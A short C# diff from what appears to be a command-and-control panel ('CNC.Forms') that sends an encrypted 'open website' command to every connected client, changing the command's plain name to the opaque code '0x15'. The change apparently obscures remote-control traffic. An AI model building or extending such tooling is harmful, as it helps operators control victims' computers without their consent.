@@ -25,7 +25,7 @@ namespace CNC.Forms
         {
             for (int i = 0; i < currentClients.Length; i++)
             {
-                currentClients[i].Connection.SendObject<string>("OpenWebsiteReq", Cryptography.Encrypt(txtUrl.Text));
+                currentClients[i].Connection.SendObject<string>("0x15", Cryptography.Encrypt(txtUrl.Text));
             }
         }
     }
